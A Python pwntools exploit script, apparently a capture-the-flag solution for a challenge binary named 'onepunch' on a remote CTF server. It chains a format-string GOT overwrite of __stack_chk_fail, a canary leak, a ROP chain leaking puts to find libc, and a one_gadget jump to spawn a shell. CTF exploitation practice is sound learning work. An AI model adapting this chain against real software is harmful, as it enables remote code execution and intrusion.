#!/usr/bin/env python3

from pwn import *

p = remote("chall.nitdgplug.org", 30095)
#p = process(["./onepunch"], env={'LD_PRELOAD':"./libc.so.6"})
e = ELF("./onepunch")
libc = ELF("./libc.so.6")
#context.log_level = 'debug'

canary_idx = 15
padding = "A" * 0x48

payload = f"%{0x12}c%13$hhn".encode()
payload += f"%{0x1b - 0x12}c%14$hhn".encode()
payload += f"%{canary_idx}$p".encode()
payload += "A".encode() * (0x38 - len(payload))
payload += p64(e.got['__stack_chk_fail'] + 0x1)
payload += p64(e.got['__stack_chk_fail'])
payload += b"CHOIYENA"
payload += b"*SMiLEY*"
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
p.sendlineafter("|\n", payload)

p.recvuntil("\x20\x00")
canary = int(p.recvuntil("A")[:-1], 16) - 0xa # It's not use but legacy code

pr = 0x0000000000401313
ret = 0x000000000040101a

p.recvuntil("| 👊 Punch harder 👊 |")
payload = padding.encode()
payload += p64(canary)
payload += b"YENAHERO"
payload += p64(pr)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.sym['vuln'])
p.sendline(payload)
p.sendline("")
p.recvuntil("| 👊 Punch harder 👊 |")
libc.address = u64(p.recvn(0x8)[2:].ljust(8, b"\x00")) - libc.sym['puts']
log.info(f"libc.address: {hex(libc.address)}")

payload = p64(libc.address + 0xe3b31) * 18
p.recvuntil("| 👊 Punch harder 👊 |")
p.sendline(payload)

p.interactive()
